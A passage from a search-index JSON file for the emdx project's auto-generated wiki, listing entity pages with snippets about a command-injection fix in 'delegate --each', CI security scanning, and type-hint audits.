--each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary","title":"Summary","text":"<p>Fixed a command injection vulnerability (DEBT-1) in <code>emdx/commands/delegate.py</code> where the <code>_run_discovery()</code> function used <code>shell=True</code> with user input from the <code>--each</code> flag, enabling...</p> <ul> <li>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37] </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_2","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_1","title":"Summary","text":"<p>Fixed CRITICAL command injection vulnerability in the <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code>. ## The Vulnerability</p> <p>The <code>--each</code> flag passed user input directly...</p> <ul> <li>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37] </li> </ul> <p>PR: https://github.com/arockwell/emdx/pull/505 Issue Reference: #6230 (Security Audit)</p>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_3","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_2","title":"Summary","text":"<p>Fixed the critical command injection vulnerability identified in the security audit. The...</p> <ul> <li>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37] </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_4","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_3","title":"Summary","text":"<p>Fixed the CRITICAL command injection vulnerability identified in security audit document #6230. ## Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code> was usi...</p> <ul> <li>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37] </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_5","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#pr-created","title":"PR Created","text":"<p>https://github.com/arockwell/emdx/pull/500</p>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_4","title":"Summary","text":"<p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature. ### The Vulnerability (CVE-worthy)...</p> <ul> <li>#6257 Delegate: Document #6230 (Security Fix Implementation) </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_6","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_5","title":"Summary","text":"<p>Implemented the critical security fix identified in Document #6230 (Security Audit Report) for the command injection vulnerability in <code>emdx delegate --each</code>. ## Issue</p> <p>The `_run_discov...</p> <ul> <li>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37] </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_7","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_6","title":"Summary","text":"<p>Fixed a HIGH severity command injection vulnerability in the <code>delegate --each</code> flag, identified in Security Audit Document #6230. ## The Vulnerability</p> <p>The <code>--each</code> flag passed use...</p> <ul> <li>#6253 Delegate: Fix command injection vulnerability in delegate --each </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_8","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_7","title":"Summary","text":"<p>Fixed a CRITICAL command injection vulnerability in the <code>delegate --each</code> feature identified in Document #6230 (Security Audit). ## Vulnerability</p> <p>File: `emdx/commands/delegate...</p> <ul> <li>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37] </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_9","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#pr-created_1","title":"PR Created","text":"<p>PR #493: https://github.com/arockwell/emdx/pull/493</p>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_8","title":"Summary","text":"<p>Fixed the CRITICAL command injection vulnerability identified in security audit document #6230. ### The Vulne...</p> <ul> <li>#6250 Delegate: Security Fix - Command Injection in --each </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_10","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/security-fix-command-injection-in-delegate-each/#summary_9","title":"Summary","text":"<p>Fixed the critical command injection vulnerability identified in Document #6230 (Security Audit). ### Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:141</code> - `_run_d...</p>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#related-entities","title":"Related Entities","text":"<ul> <li><code>added</code>safe_discovery_commands<code>allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>after (secure)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>added</code>_validate_discovery_command()<code>function</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>locate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>before (vulnerable)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>security impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>risk assessment update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>security fix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=5.4)</li> <li><code>tests/test_commands_delegate.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/security-fix/","title":"security fix","text":"<p>Type: tech_term | Mentioned in: 20 documents | First seen: 2026-02-14</p>"},{"location":"entities/security-fix/#documents-20","title":"Documents (20)","text":"<ul> <li>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three Navigation Modes <p>...\u2014 <code>command injection</code> clusters with <code>shlex.split()</code>, <code>shell=true</code>, <code>shell=false</code>, <code>security fix</code></p> </li> <li>Use simple connected-components on the co-occurrence graph (entities that appear together in &gt;= 3 docs)</li> <li> <p>Name clusters by the highest-scoring entity in each clus...</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands</p> </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix/#summary","title":"Summary","text":"<p>Fixed a command injection vulnerability (DEBT-1) in <code>emdx/commands/delegate.py</code> where the <code>_run_discovery()</code> function used <code>shell=True</code> with user input from the <code>--each</code> flag, enabling...</p> <ul> <li>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Files Changed <ul> <li><code>emdx/commands/delegate.py</code> - Security fix (+79 lines)</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code> - Security tests (+142 lines)</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each</p> </li> </ul> <p>Date: 2026-02-14 Severity: HIGH \u2192 RESOLVED Issue: Document #6230 (Security Audit Report)</p>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each_1","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix/#summary_1","title":"Summary","text":"<p>Fixed a critical command injection vulnerability in the `emdx delegate --each...</p> <ul> <li>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37] </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each_2","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/security-fix/#summary_2","title":"Summary","text":"<p>Fixed CRITICAL command injection vulnerability in the <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code>. ## The Vulnerability</p> <p>The <code>--each</code> flag passed user input directly...</p> <ul> <li>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37] </li> </ul> <p>PR: https://github.com/arockwell/emdx/pull/505 Issue Reference: #6230 (Security Audit)</p>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each_3","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/security-fix/#summary_3","title":"Summary","text":"<p>Fixed the critical command injection vulnerability identified in the security audit. The...</p> <ul> <li>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37] </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each_4","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix/#summary_4","title":"Summary","text":"<p>Fixed the CRITICAL command injection vulnerability identified in security audit document #6230. ## Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code> was usi...</p> <ul> <li>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37] </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each_5","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix/#pr-created","title":"PR Created","text":"<p>https://github.com/arockwell/emdx/pull/500</p>"},{"location":"entities/security-fix/#summary_5","title":"Summary","text":"<p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature. ### The Vulnerability (CVE-worthy)...</p> <ul> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Summary</p> <p>Implemented the critical security fix identified in Document #6230 (Security Audit Report) for the command injection vulnerability in <code>emdx delegate --each</code>.</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Files Modified</p> <ul> <li><code>emdx/commands/delegate.py</code> - Security fix implementation</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code> - 31 new security tests</p> </li> <li> <p>#6254 Delegate: Fix command injection in --each discovery</p> </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-discovery","title":"Security Fix: Command Injection in Delegate Discovery","text":""},{"location":"entities/security-fix/#summary_6","title":"Summary","text":"<p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature. ## The Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py:141</code> ...</p> <ul> <li>#6253 Delegate: Fix command injection vulnerability in delegate --each </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each_6","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix/#summary_7","title":"Summary","text":"<p>Fixed a CRITICAL command injection vulnerability in the <code>delegate --each</code> feature identified in Document #6230 (Security Audit). ## Vulnerability</p> <p>File: `emdx/commands/delegate...</p> <ul> <li>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37] </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each_7","title":"Security Fix: Command Injection in delegate --each","text":""},{"location":"entities/security-fix/#pr-created_1","title":"PR Created","text":"<p>PR #493: https://github.com/arockwell/emdx/pull/493</p>"},{"location":"entities/security-fix/#summary_8","title":"Summary","text":"<p>Fixed the CRITICAL command injection vulnerability identified in security audit document #6230. ### The Vulne...</p> <ul> <li>#6250 Delegate: Security Fix - Command Injection in --each </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-each_8","title":"Security Fix: Command Injection in Delegate --each","text":""},{"location":"entities/security-fix/#summary_9","title":"Summary","text":"<p>Fixed the critical command injection vulnerability identified in Document #6230 (Security Audit). ### Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:141</code> - `_run_d...</p> <ul> <li>#6243 Delegate: Fix command injection in --each flag </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-vulnerability-in-delegate-each","title":"Security Fix: Command Injection Vulnerability in delegate --each","text":""},{"location":"entities/security-fix/#summary_10","title":"Summary","text":"<p>Fixed a CRITICAL command injection vulnerability in <code>emdx/commands/delegate.py</code> where the <code>--each</code> flag passed user input directly to a shell via `subprocess.run(comm...</p> <ul> <li>#6242 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [8/37] </li> </ul>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-discovery_1","title":"Security Fix: Command Injection in Delegate Discovery","text":""},{"location":"entities/security-fix/#summary_11","title":"Summary","text":"<p>Fixed CRITICAL command injection vulnerability in <code>emdx delegate --each</code> feature. ## Vulnerability</p> <p>File: <code>emdx/commands/delegate.py:144</code> Severity: HIGH</p> <p>The <code>--each</code> ...</p> <ul> <li>#6241 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]   Section: Pull Request <p>Files changed:</p> </li> <li><code>emdx/commands/delegate.py</code> - Security fix</li> <li> <p><code>tests/test_commands_delegate.py</code> - Added 12 new tests</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]</p> </li> </ul> <p>Issue: CRITICAL - The <code>--each</code> flag in <code>emdx delegate</code> was vulnerable to command injection due to using <code>shell=True</code> with user-provided input. Severity: HIGH</p>"},{"location":"entities/security-fix/#security-fix-command-injection-in-delegate-discovery_2","title":"Security Fix: Command Injection in Delegate Discovery","text":""},{"location":"entities/security-fix/#the-problem","title":"The Problem","text":"<p>```python ...</p>"},{"location":"entities/security-fix/#related-entities","title":"Related Entities","text":"<ul> <li><code>security fix: command injection in delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=5.4)</li> <li><code>before (vulnerable)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.4)</li> <li><code>the vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>after (secure)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>delegate discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>added</code>_validate_discovery_command()<code>function</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>security fix: command injection in delegate discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>risk assessment update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/security/","title":"security","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2025-07-07</p>"},{"location":"entities/security/#documents-13","title":"Documents (13)","text":"<ul> <li>#6347 Tech Debt Campaign - FINAL RESULTS   Section: Final Scorecard: 19 PRs Merged </li> <li> <p>\u2705 DEBT-1: Command injection in delegate --each (PR #518)</p> </li> <li> <p>#185 MCP-SETUP-GUIDE   Section: Important Notes</p> </li> <li>Gmail tokens are encrypted and stored locally</li> <li>PostgreSQL Pro has UNRESTRICTED access - use carefully</li> <li> <p>Never commit credentials to git</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Best Practices</p> <ol> <li>Tagging Strategy: Apply semantic tags for filtering and analytics</li> </ol> </li> <li>Content: <code>analysis</code>, <code>bugfix</code>, <code>security</code>, <code>refactor</code></li> <li>Status: <code>active</code>, <code>done</code>, <code>blocked</code></li> <li> <p>Outcome: <code>success</code>, <code>failed</code>, <code>partial</code></p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Human Patterns</p> <p>Tagging Approach:</p> </li> <li>Semantic tags for recall: <code>security</code>, <code>auth</code>, <code>todo</code></li> <li>Emoji tags for visual scanning in TUI: \ud83c\udfaf, \ud83d\udccb, \u2705</li> <li>Applied after reflection, sometimes via <code>--suggest-tags</code></li> <li> <p>Text aliases auto-convert: <code>gameplan</code> \u2192 \ud83d\udccb</p> </li> <li> <p>#6359 Delegate: DEBT-11: Add security scanning to the CI pipeline. Edit .git [3/3]   Section: DEBT-11: Security Scanning Added to CI Pipeline</p> </li> <li> <p>#6282 DEBT-11: Add security scanning to CI   Section: DEBT-11: Add Security Scanning to CI</p> </li> <li> <p>#6281 DEBT-16: Dependabot and Renovate Configuration   Section: Files Created</p> <p>...black, ruff, mypy)</p> </li> <li>Lock file maintenance: Monthly on first day of month</li> <li>Security alerts: Enabled with <code>security</code> label</li> <li>Package-specific rules for Python and GitHub Actions</li> <li> <p>Lower priority for dev dependencies</p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: 6. Scheduled/Cron Delegates</p> <p>```python</p> </li> </ul>"},{"location":"entities/security/#security_1","title":"Security","text":""},{"location":"entities/security/#security_2","title":"Security","text":""},{"location":"entities/security/#summary","title":"Summary","text":"<p>Added bandit (code security scanner) and pip-audit (dependency vulnerability scanner) to the CI pipeline.</p>"},{"location":"entities/security/#summary_1","title":"Summary","text":"<p>Added a security scanning job to <code>.github/workflows/test.yml</code> that runs:</p>"},{"location":"entities/security/#emdx-recipe-create","title":"emdx recipe create","text":"<p>{     \"name\": \"daily-security-scan\",     \"schedule\": \"0 9 * * *\",  # 9am daily     \"command\": [\"--synthesize\", \"scan for XSS\", \"check CSRF tokens\", \"review auth\"] }</p> <ul> <li> <p>#247 Clauding Implementation Plan - Critical Issues Resolution   Section: Clauding Implementation Plan - Critical Issues Resolution</p> <p>...e clauding codebase analysis (document #2074). Issues are prioritized by severity: security vulnerabilities first, then critical functionality, followed by performance and feature enhancements.</p> </li> <li> <p>#251 Claude Backup and Restore System   Section: Best Practices</p> <ol> <li>Security</li> </ol> </li> <li>Encrypt sensitive backups</li> <li>Restrict backup file permissions</li> <li> <p>Separate private data backups</p> </li> <li> <p>#162 Claude Stored Procedures POC   Section: Benefits of This Approach</p> <p>...* - Logic backed up with data</p> </li> <li>Performance - Reduced network roundtrips</li> <li> <p>Security - Can use row-level security and SECURITY DEFINER</p> </li> <li> <p>#18 Clauding Project Gameplan - Updated   Section: \u2705 What's Working Well</p> <p>...IMPLEMENTED</p> </li> <li>iTerm2 clickable links implementation (#2104) - #IMPLEMENTED</li> <li>Security fixes with <code>__claude_safe_insert</code> (#2081) - #IMPLEMENTED</li> <li> <p>Configuration system with <code>claude-config.fish</code> - #IMPLEMENTED</p> </li> <li> <p>#19 Clauding Project Gameplan   Section: \ud83d\udd04 Known Issues</p> <ol> <li>Security Concerns</li> </ol> </li> <li>Some SQL injection vulnerabilities remain</li> <li>Hardcoded usernames in some functions</li> <li>No input validation framework</li> </ul>"},{"location":"entities/security/#related-entities","title":"Related Entities","text":"<ul> <li><code>\ud83d\udd04 known issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>\u2705 what's working well</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>standard fish plugin structure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>speed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>short-term goals (2 weeks)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>shell support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>search enhancements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>rich content support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>recent additions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>quality</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/sentencetransformer/","title":"sentencetransformer","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/sentencetransformer/#documents-8","title":"Documents (8)","text":"<ul> <li>#6518 Any removal Phase 1: Quick wins   Section: 3. Added TYPE_CHECKING guards for optional dependencies <p>emdx/services/embedding_service.py:</p> </li> <li>Added <code>TYPE_CHECKING</code> import with <code>SentenceTransformer</code> type</li> <li>Changed global <code>_model</code> variable type from untyped to <code>SentenceTransformer | None</code></li> <li> <p>Changed <code>_get_model()</code> return type from <code>Any</code> to <code>SentenceTransformer</code></p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li><code>anthropic.Anthropic</code></li> <li><code>SentenceTransformer</code></li> <li><code>EmbeddingService</code></li> <li> <p><code>watchdog.Observer</code></p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Common Patterns Identified</p> </li> <li> <p>#6490 Any Type Removal Analysis [4/5]   Section: 1. <code>_get_model</code> return type (Line 30)</p> <p>Recommended: ```python from typing import TYPE_CHECKING if TYPE_CHECKING:     from sentence_transformers import SentenceTransformer</p> </li> <li> <p>#6434 Any/None typing audit [4/5]   Section: embedding_service.py</p> Function Any Location Replaceable? Suggested Replacement <code>_get_model()</code> Return <code>Any</code> \u274c Skip External API wrapper (<code>SentenceTransformer</code>) - genuinely needed </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: emdx/services/embedding_service.py</p> </li> <li>Location: Line 30</li> <li>Current Type: <code>Any</code></li> <li>Actual Type: <code>SentenceTransformer</code></li> <li> <p>Rationale: Returns the SentenceTransformer model. Use TYPE_CHECKING guard for optional dep.</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> </li> </ul>"},{"location":"entities/sentencetransformer/#2-optional-dependency-types-high-priority","title":"2. Optional Dependency Types (High Priority)","text":"<p>Services use <code>Any</code> for lazily-loaded optional dependencies:</p>"},{"location":"entities/sentencetransformer/#5-optional-dependency-types-6-occurrences","title":"5. Optional dependency types (6 occurrences)","text":"<p>Solution: <code>TYPE_CHECKING</code> guards for <code>anthropic.Anthropic</code>, <code>SentenceTransformer</code>, <code>Observer</code>, <code>FileSystemEvent</code></p>"},{"location":"entities/sentencetransformer/#13-_get_model-any","title":"13. <code>_get_model() -&gt; Any</code>","text":""},{"location":"entities/sentencetransformer/#1-missing-return-type-on-_get_model-potential-runtime-attributeerror","title":"1. Missing return type on <code>_get_model()</code> - potential runtime AttributeError","text":"<p>File: <code>emdx/services/embedding_service.py:31</code> Issue: Returns SentenceTransformer model but no type hint, callers can't validate API usage Severity: CRITICAL</p>"},{"location":"entities/sentencetransformer/#related-entities","title":"Related Entities","text":"<ul> <li><code>observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>anthropic.anthropic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>_get_model()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>watchdog.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>on_modified</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>update functions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>simplevimlinenumbers.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>self.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>searchscreen.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>mergemetadata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/services/","title":"services/","text":"<p>Type: tech_term | Mentioned in: 17 documents | First seen: 2026-02-13</p>"},{"location":"entities/services/#documents-17","title":"Documents (17)","text":"<ul> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Overview</p> <p>Three parallel audits covered the entire <code>emdx/</code> codebase \u2014 <code>services/</code> (+ <code>cli_executor/</code>), <code>config/</code>, <code>models/</code>, and <code>utils/</code>. The combined results reveal significant dead code accumulation across the project.</p> </li> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>...<code>commands/groups.py</code> file doesn't exist, <code>database/groups.py</code> doesn't exist, and <code>services/group_service.py</code> doesn't exist.</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Production Code (<code>services/</code> + <code>ui/</code>)</p> <ul> <li>8 actionable <code>dict[str, Any]</code> / bare <code>dict</code> returns in <code>services/</code> across 3 files</li> </ul> </li> <li>21 fixable <code>Any</code>-typed parameters in <code>ui/</code> across 14 files</li> <li> <p>Most fixes are mechanical: add <code>TypedDict</code> definitions or <code>TYPE_CHECKING</code> guards -...</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: All 45 TypedDicts (by location)</p> </li> <li> <p>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: Executive Summary</p> <p>...his audit analyzed the EMDX codebase across three major directories (<code>commands/</code>, 